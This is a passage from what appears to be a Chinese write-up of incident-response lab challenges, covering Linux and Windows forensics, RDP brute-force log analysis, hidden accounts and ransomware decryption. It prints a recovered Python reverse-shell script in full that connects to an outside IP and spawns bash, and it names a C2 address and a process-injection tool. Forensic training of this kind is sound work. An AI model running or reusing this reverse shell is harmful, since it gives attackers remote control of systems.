<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@xuanji:/tmp/.temp/libprocesshider# <span class="hljs-built_in">cat</span> 1.py<br><span class="hljs-comment">#!/usr/bin/python3</span><br><br>import socket,subprocess,os,sys, time<br><br>pidrg = os.fork()<br><span class="hljs-keyword">if</span> pidrg &gt; 0:<br>        sys.exit(0)<br><br>os.chdir(<span class="hljs-string">&quot;/&quot;</span>)<br>os.setsid()<br>os.umask(0)<br>drgpid = os.fork()<br><span class="hljs-keyword">if</span> drgpid &gt; 0:<br>        sys.exit(0)<br><br><span class="hljs-keyword">while</span> 1:<br>        try:<br>                sys.stdout.flush()<br>                sys.stderr.flush()<br>                fdreg = open(<span class="hljs-string">&quot;/dev/null&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br>                sys.stdout = fdreg<br>                sys.stderr = fdreg<br>                sdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>                sdregs.connect((&quot;<span class="hljs-number">114.114</span>.<span class="hljs-number">114.121</span>&quot;,<span class="hljs-number">9999</span>))<br>                os.dup2(sdregs.fileno(),0)<br>                os.dup2(sdregs.fileno(),1)<br>                os.dup2(sdregs.fileno(),2)<br>                p=subprocess.call([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>])<br>                sdregs.close()<br>        except Exception:<br>                pass<br>        time.sleep(2)<br></code></pre></td></tr></table></figure>
<p>是弹shell(为什么不是shell.py呢)</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">109</span>CCB5768C70638E24FB46EE7957E37&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q2-7"><a class="markdownIt-Anchor" href="#q2-7"></a> Q2</h2>
<p>参考上面的内容</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">114.114.114.121:9999</span>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q3-7"><a class="markdownIt-Anchor" href="#q3-7"></a> Q3</h2>
<p>查找所有具有 SUID 权限的可执行文件，并列出它们的详细信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@xuanji:~# find / -perm -4000 -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -la &#123;&#125; 2&gt;/dev/null \;<br>-rwsr-xr-x. 1 root root 94792 Nov 23  2016 /bin/mount<br>-rwsr-xr-x. 1 root root 44168 May  7  2014 /bin/ping<br>-rwsr-xr-x. 1 root root 44680 May  7  2014 /bin/ping6<br>-rwsr-xr-x. 1 root root 36936 May 16  2017 /bin/su<br>-rwsr-xr-x. 1 root root 69120 Nov 23  2016 /bin/umount<br>-rwsr-xr-x. 1 root root 46424 May 16  2017 /usr/bin/chfn<br>-rwsr-xr-x. 1 root root 41336 May 16  2017 /usr/bin/chsh<br>-rwsr-xr-x. 1 root root 229992 Jan  6  2014 /usr/bin/find<br>-rwsr-xr-x. 1 root root 72280 May 16  2017 /usr/bin/gpasswd<br>-rwsr-xr-x. 1 root root 36592 May 16  2017 /usr/bin/newgrp<br>-rwsr-xr-x. 1 root root 47032 May 16  2017 /usr/bin/passwd<br>-rwsr-xr-x. 1 root root 155008 May 29  2017 /usr/bin/sudo<br>-rwsr-xr-x. 1 root root 10240 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device<br>-rwsr-xr-x. 1 root root 440416 Mar  4  2019 /usr/lib/openssh/ssh-keysign<br></code></pre></td></tr></table></figure>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">flag&#123;<span class="hljs-number">7</span>FD5884F493F4AAF96ABEE286EE04120&#125;<br><span class="hljs-regexp">/usr/</span>bin/<span class="hljs-keyword">find</span><br></code></pre></td></tr></table></figure>
<h2 id="q4-7"><a class="markdownIt-Anchor" href="#q4-7"></a> Q4</h2>
<p><code>opt</code>通常用于通常用于安装<strong>第三方软件</strong>或<strong>自定义程序</strong>，不是系统默认二进制文件的位置。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@xuanji:~# <span class="hljs-built_in">cd</span> /opt<br>root@xuanji:/opt# <span class="hljs-built_in">ls</span><br>root@xuanji:/opt# <span class="hljs-built_in">ls</span> /<br>1.<span class="hljs-built_in">log</span>  bin  boot  core  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  supervisord.log  supervisord.pid  sys  tmp  usr  var<br>root@xuanji:/opt# <span class="hljs-built_in">ls</span> -al<br>total 16<br>drwxr-xr-x. 1 root root    30 Aug  3  2023 .<br>drwxr-xr-x. 1 root root    85 Mar  4 14:11 ..<br>drwxr-xr-x. 3 ctf  1000 16384 Aug  3  2023 .cymothoa-1-beta<br>root@xuanji:/opt# <span class="hljs-built_in">cd</span> .cymothoa-1-beta<br>root@xuanji:/opt/.cymothoa-1-beta# <span class="hljs-built_in">ls</span><br>Makefile  bgrep.c  cymothoa    cymothoa.h             payloads    personalization.h  syscalls.txt  udp_server.c<br>bgrep     core     cymothoa.c  hexdump_to_cstring.pl  payloads.h  syscall_code.pl    udp_server<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/opt/.cymothoa-1-beta/cymothoa<br>flag&#123;087C267368ECE4FCF422FF733B51AED9&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q5-5"><a class="markdownIt-Anchor" href="#q5-5"></a> Q5</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 /tmp/.temp/libprocesshider/1.py<br>root@xuanji:~# <span class="hljs-built_in">which</span> python3<br>/usr/bin/python3<br>root@xuanji:~# <span class="hljs-built_in">ls</span> -la /usr/bin/python3<br>lrwxrwxrwx. 1 root root 9 Mar 23  2014 /usr/bin/python3 -&gt; python3.4<br></code></pre></td></tr></table></figure>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">usr</span>/bin/python3.4&#125;</span><br></code></pre></td></tr></table></figure>
<h1 id="第四章-windows实战-日志分析"><a class="markdownIt-Anchor" href="#第四章-windows实战-日志分析"></a> 第四章 windows实战-日志分析</h1>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">题目描述：<br>  某台Windows服务器遭到攻击者入侵，管理员查看发现存在大量rdp爆破的请求，攻击者使用了不同位置的IP(此处模拟)，进行爆破并成功，并成功进入了系统，进入系统后又做了其它危害性操作，请根据各题目完成填写<br></code></pre></td></tr></table></figure>
<h2 id="q1-8"><a class="markdownIt-Anchor" href="#q1-8"></a> Q1</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">审计桌面的logs日志，定位所有扫描IP，并提交扫描次数<br></code></pre></td></tr></table></figure>
<p>登录之后将log移动到本地</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ <span class="hljs-built_in">cat</span> access.log | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr<br>   6331 192.168.150.67<br>    524 192.168.150.1<br>    169 127.0.0.1<br>     54 192.168.150.33<br>      1 192.168.150.60<br></code></pre></td></tr></table></figure>
<p>首先排除<code>127.0.0.1</code>去log里面简单进行排查一下</p>
<p>分析后发现</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">6331 </span><span class="hljs-number">192.168</span>.<span class="hljs-number">150.67</span><br><span class="hljs-symbol">54 </span><span class="hljs-number">192.168</span>.<span class="hljs-number">150.33</span><br></code></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">6385</span>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q2-8"><a class="markdownIt-Anchor" href="#q2-8"></a> Q2</h2>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">审计相关日志，提交rdp被爆破失败次数<br></code></pre></td></tr></table></figure>
<p>RDP 登录失败通常会记录在 Windows 安全日志中，特别是 <strong>事件ID 4625</strong>（失败的登录事件）</p>
<p><img src="../../images/%E7%8E%84%E6%9C%BA//2025-03-05194159.png" srcset="/img/loading.gif" lazyload alt="2025-03-05194159"></p>
<p>flag{2594}</p>
<h2 id="q3-8"><a class="markdownIt-Anchor" href="#q3-8"></a> Q3</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">审计相关日志，提交成功登录rdp的远程IP地址，多个以&amp;连接,以从小到大顺序排序提交<br></code></pre></td></tr></table></figure>
<p>RDP 成功登录事件的 <strong>事件ID 4624</strong> 表示成功的登录事件(慢慢手查，太卡了)</p>
<p><strong>FullEventLogView 是一款由 NirSoft 开发的轻量级工具，用于查看和导出 Windows 事件日志的详细信息。它提供了一个直观的界面，方便用户浏览 Windows 系统中的所有事件日志，并支持多种过滤和排序功能。</strong></p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.150.1</span><br><span class="hljs-number">192.168.150.178</span><br><span class="hljs-number">192.168.150.128</span><br></code></pre></td></tr></table></figure>
<p>还有的就是本地和127的连接可以排除</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.150.1</span>&amp;<span class="hljs-number">192.168.150.128</span>&amp;<span class="hljs-number">192.168.150.178</span>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q4-8"><a class="markdownIt-Anchor" href="#q4-8"></a> Q4</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">提交黑客创建的隐藏账号<br></code></pre></td></tr></table></figure>
<p>Windows 系统会在安全日志中记录账户创建的事件。需要关注事件 <strong>ID 4720</strong>（账户创建事件）</p>
<p><img src="../../images/%E7%8E%84%E6%9C%BA//2025-03-05195709.png" srcset="/img/loading.gif" lazyload alt="2025-03-05195709"></p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">hacker<span class="hljs-symbol">$</span><br></code></pre></td></tr></table></figure>
<h2 id="q5-6"><a class="markdownIt-Anchor" href="#q5-6"></a> Q5</h2>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">提交黑客创建的影子账号<br></code></pre></td></tr></table></figure>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">hackers<span class="hljs-symbol">$</span><br></code></pre></td></tr></table></figure>
<p>我的建议就是手查，一共就这几个用户</p>
<h2 id="q6"><a class="markdownIt-Anchor" href="#q6"></a> Q6</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">提交远程shell程序的连接IP+端口，以IP:port方式提交<br></code></pre></td></tr></table></figure>
<p>尝试直接进行了<strong>netstat -ano</strong>,但是没有显示ip</p>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-05200028.png" srcset="/img/loading.gif" lazyload alt="2025-03-05200028"></p>
<p>看了wp去看了任务计划程序，然后看到有一个定时任务，下载了一个xiaowei.exe拖到桌面分析一下</p>
<p><a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/file/2a357e65570114333a1a4bc21eb45d048520f93aab45546a08dd5b917ac33585/behavior">VirusTotal - 文件</a></p>
<p><img src="../../images/%E7%8E%84%E6%9C%BA//2025-03-05200628.png" srcset="/img/loading.gif" lazyload alt="2025-03-05200628"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">185.117.118.21:4444</span>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q7"><a class="markdownIt-Anchor" href="#q7"></a> Q7</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">黑客植入了一个远程shell，审计相关进程和自启动项提交该程序名字<br></code></pre></td></tr></table></figure>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">xiaowei.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure>
<h2 id="q8"><a class="markdownIt-Anchor" href="#q8"></a> Q8</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">黑客使用了计划任务来定时执行某shell程序，提交此程序名字<br></code></pre></td></tr></table></figure>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-05200840.png" srcset="/img/loading.gif" lazyload alt="2025-03-05200840"></p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;download.bat&#125;</span><br></code></pre></td></tr></table></figure>
<h1 id="第四章-windows实战-向日葵"><a class="markdownIt-Anchor" href="#第四章-windows实战-向日葵"></a> 第四章 windows实战-向日葵</h1>
<h2 id="q1-9"><a class="markdownIt-Anchor" href="#q1-9"></a> Q1</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">通过本地 PC RDP到服务器并且找到黑客首次攻击成功的时间为 为多少,将黑客首次攻击成功的时间为 作为 FLAG 提交(2028-03-26 08:11:25.123);<br></code></pre></td></tr></table></figure>
<p>桌面有向日葵，找到源文件位置，看log最大的哪个，先写出的是ip，也就是q2，q1可以看出执行了whoami说明连接成功了</p>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-10191905.png" srcset="/img/loading.gif" lazyload alt="2025-03-10191905"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">26</span> <span class="hljs-number">10</span>:<span class="hljs-number">16</span>:<span class="hljs-number">25</span>.<span class="hljs-number">585</span><br></code></pre></td></tr></table></figure>
<h2 id="q2-9"><a class="markdownIt-Anchor" href="#q2-9"></a> Q2</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">通过本地 PC RDP到服务器并且找到黑客攻击的 IP 为多少,将黑客攻击 IP 作为 FLAG 提交;<br></code></pre></td></tr></table></figure>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-10191733.png" srcset="/img/loading.gif" lazyload alt="2025-03-10191733"></p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.31.45</span><br></code></pre></td></tr></table></figure>
<h2 id="q3-9"><a class="markdownIt-Anchor" href="#q3-9"></a> Q3</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">通过本地 PC RDP到服务器并且找到黑客托管恶意程序 IP 为,将黑客托管恶意程序 IP 作为 FLAG 提交;<br></code></pre></td></tr></table></figure>
<p>看进行的命令执行，ping了后面的内容，有指定的ip</p>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-10192422.png" srcset="/img/loading.gif" lazyload alt="2025-03-10192422"></p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.31.249</span><br></code></pre></td></tr></table></figure>
<h2 id="q4-9"><a class="markdownIt-Anchor" href="#q4-9"></a> Q4</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">找到黑客解密 DEC 文件,将黑客DEC 文件的 md5 作为 FLAG 提交;<br></code></pre></td></tr></table></figure>
<p>先直接搜索DEC文件，发现没有内容，再搜一下txt文件，发现有个qq文件，给了qq号，在玄机一群里面有文件，下载下来</p>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-10192606.png" srcset="/img/loading.gif" lazyload alt="2025-03-10192606"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(orange㉿Coyano)-[/mnt/d/Tencent/TIM/file]<br>└─$ <span class="hljs-built_in">md5sum</span> DEC*<br>5ad8d202f80202f6d31e077fc9b0fc6b  DEC.pem<br></code></pre></td></tr></table></figure>
<h2 id="q5-7"><a class="markdownIt-Anchor" href="#q5-7"></a> Q5</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">通过本地 PC RDP到服务器并且解密黑客勒索软件,将桌面加密文件中关键信息作为 FLAG 提交;<br></code></pre></td></tr></table></figure>
<p>DEC给了私钥尝试解密</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">N2xTZ2Bsn2Y5lve7KZ36bgsFjqncBs55VO0zkeEIr5Iga/kbegA0BAstotBWnZ16+trNfkzl3apUobodMkC8covEo22p+kWAyVjMRyJ98EQ4Pspr/Y5HIuH0xuvPa82j7b0AMJHkyd2viuymI/mrxjJk2X0xlEE4YVioMLd22+w=<br><br>Your files have been <span class="hljs-keyword">encrypted</span><br><br><span class="hljs-number">0</span>sWK8adKSGh1Xaxo6n1mZFoyNDYVokXwkBhxnzxU+MEJIV44u48SdOiFzWLn849hObaP6z26lLtMnXaDUnAPuMh+nF2hw9RoAsur7KYxE8/iY/y4jOEBsHT5wvQldcNfntrDyMUCvrWTUHl2yapUmaIIf2rZsNsqMVJ9puZzp58+FJmulyC7R1C2yoP1jHhsdOkU7htbzUWWsm2ybL+eVpXTFC+i6nuEBoAYhv2kjSgL8qKBFsLKmKQSn/ILRPaRYDFP/srEQzF7Y4yZa4cotpFTdGUVU547Eib/EaNuhTyzgOGKjXl2UYxHM/v0c3lgjO7GDA9eF3a/BBXPAgtK126lUfoGK7iSAhduRt5sRP4=<br></code></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> cryptography.hazmat.primitives <span class="hljs-keyword">import</span> serialization, hashes<br><span class="hljs-keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="hljs-keyword">import</span> padding<br><span class="hljs-keyword">from</span> cryptography.hazmat.backends <span class="hljs-keyword">import</span> default_backend<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment"># 加载 RSA 私钥</span><br>private_key_pem = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="hljs-string">MIICXQIBAAKBgQDWQqpkHRKtRu66MjTrNZC13A6rIlGaJBd/FYBy4ifiITasCnQE</span><br><span class="hljs-string">J9aRTIYQsM5iincecnvY8xGYMg5pVTp6P4fxS4/+1bAEciRXSTCmLI8FeDd3sjOc</span><br><span class="hljs-string">HTw82sG0hfnnb0b/LFhbOCk7BgLnpwvSy5za/dtVQFSDbQbQuTBp029AKwIDAQAB</span><br><span class="hljs-string">AoGBAKh6952NtvgGhQZpIG+sSUSX6/jqHZzFsKw/7idoatBIKcOS3LO/19udfvZ0</span><br><span class="hljs-string">8XVPSGfqwjRQvo8dHXP6juc+Odg1XOLPw4fjjJz9b9dLKCKwtIU3CwA1AmuhYNGp</span><br><span class="hljs-string">1OXlHLyUaNVTN3TZN9Dn7txD4gOvLIirqbmhzy/N7PdPF5ThAkEA4MB++5DSY7Kv</span><br><span class="hljs-string">MO1uHuxTr/jRy6754Mzgo0fpLBXSB13/nLMxRA6QEbigoAFpsFd36EYMKzftbezB</span><br><span class="hljs-string">gx2nphvLUwJBAPQMv730MqCWjaCPLgYRV+oMU6OnOMs6+ALql+I1eVqVfBAt+5De</span><br><span class="hljs-string">HMxY7mWdaR9pofzuz+6KkmwRHqKSVw45dMkCQFJ68l76B+vkoFxxVe9tRU0YIE4C</span><br><span class="hljs-string">mdtA9NOXSWAPZfOkMHFeZZ8XRRHr0q7FtfasMuoAAuk9bhngQCgREvxnyNcCQGnt</span><br><span class="hljs-string">trQecHMfpe2Q+CsOEBi4rP0VsiMUP14UsUQwbbIRvD3Rl6WzotBXsXJNtrk5wmPk</span><br><span class="hljs-string">zD//ybo6XA+4cSztZ3ECQQC92ck1XJm7V12SOFqHcNXFoS8tFvgNQXNEahmhJ2wb</span><br><span class="hljs-string">xTo0VwUhCeG1n8X5PqRn6Rcsh8YQAt924YrWtcTxrg8g</span><br><span class="hljs-string">-----END RSA PRIVATE KEY-----</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>private_key = serialization.load_pem_private_key(<br>    private_key_pem.encode(),<br>    password=<span class="hljs-literal">None</span>,<br>    backend=default_backend()<br>)<br><br><span class="hljs-comment"># 加密数据（Base64 解码）</span><br>encrypted_data = base64.b64decode(<span class="hljs-string">&quot;N2xTZ2Bsn2Y5lve7KZ36bgsFjqncBs55VO0zkeEIr5Iga/kbegA0BAstotBWnZ16+trNfkzl3apUobodMkC8covEo22p+kWAyVjMRyJ98EQ4Pspr/Y5HIuH0xuvPa82j7b0AMJHkyd2viuymI/mrxjJk2X0xlEE4YVioMLd22+w=&quot;</span>)<br><br><span class="hljs-comment"># 打印加密数据的长度</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Length of encrypted data:&quot;</span>, <span class="hljs-built_in">len</span>(encrypted_data))<br><br><span class="hljs-comment"># 尝试使用 PKCS1_OAEP 填充模式</span><br><span class="hljs-keyword">try</span>:<br>    decrypted_data = private_key.decrypt(<br>        encrypted_data,<br>        padding.OAEP(<br>            mgf=padding.MGF1(algorithm=hashes.SHA256()),<br>            algorithm=hashes.SHA256(),<br>            label=<span class="hljs-literal">None</span><br>        )<br>    )<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted data (OAEP):&quot;</span>, decrypted_data.decode())<br><span class="hljs-keyword">except</span> ValueError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decryption with OAEP failed. Trying PKCS1_v1_5...&quot;</span>)<br><br>    <span class="hljs-comment"># 尝试使用 PKCS1_v1_5 填充模式</span><br>    <span class="hljs-keyword">try</span>:<br>        decrypted_data = private_key.decrypt(<br>            encrypted_data,<br>            padding.PKCS1v15()<br>        )<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted data (PKCS1_v1_5):&quot;</span>, decrypted_data.decode())<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decryption with PKCS1_v1_5 also failed.&quot;</span>)<br>        <span class="hljs-comment"># NXVJSTQUAPGTXKSX</span><br></code></pre></td></tr></table></figure>
<p>得到钥匙之后再进行AES的解密</p>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-10194051.png" srcset="/img/loading.gif" lazyload alt="2025-03-10194051"></p>
<h1 id="第五章-windows-实战-evtx-文件分析"><a class="markdownIt-Anchor" href="#第五章-windows-实战-evtx-文件分析"></a> 第五章 Windows 实战-evtx 文件分析</h1>
<h2 id="q1-10"><a class="markdownIt-Anchor" href="#q1-10"></a> Q1</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">1.将黑客成功登录系统所使用的IP地址作为Flag值提交；<br></code></pre></td></tr></table></figure>
<p>搜索事件<code>4624</code>一个个翻</p>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-09121606.png" srcset="/img/loading.gif" lazyload alt="2025-03-09121606"></p>
<h2 id="q2-10"><a class="markdownIt-Anchor" href="#q2-10"></a> Q2</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">2.黑客成功登录系统后修改了登录用户的用户名，将修改后的用户名作为Flag值提交；<br></code></pre></td></tr></table></figure>
<ul>
<li><strong>事件ID 4722</strong>: 用户账户被修改。这个事件通常记录了用户账户属性的更改，包括用户名的修改。</li>
<li><strong>事件ID 4738</strong>: 用户账户被修改。这个事件通常用于记录用户账户属性的更改，包括用户名的修改。</li>
</ul>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-09122112.png" srcset="/img/loading.gif" lazyload alt="2025-03-09122112"></p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;Adnimistartro&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="q3-10"><a class="markdownIt-Anchor" href="#q3-10"></a> Q3</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">3.黑客成功登录系统后成功访问了一个关键位置的文件，将该文件名称（文件名称不包含后缀）作为Flag值提交；<br></code></pre></td></tr></table></figure>
<ul>
<li>
